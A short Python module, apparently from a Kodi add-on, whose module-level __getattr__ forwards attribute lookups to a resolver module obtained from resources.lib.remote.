def __getattr__(name):
    from resources.lib.remote import get_evil_resolver as _ger
    mod = _ger()
    if mod is None:
        raise AttributeError(name)
    return getattr(mod, name)
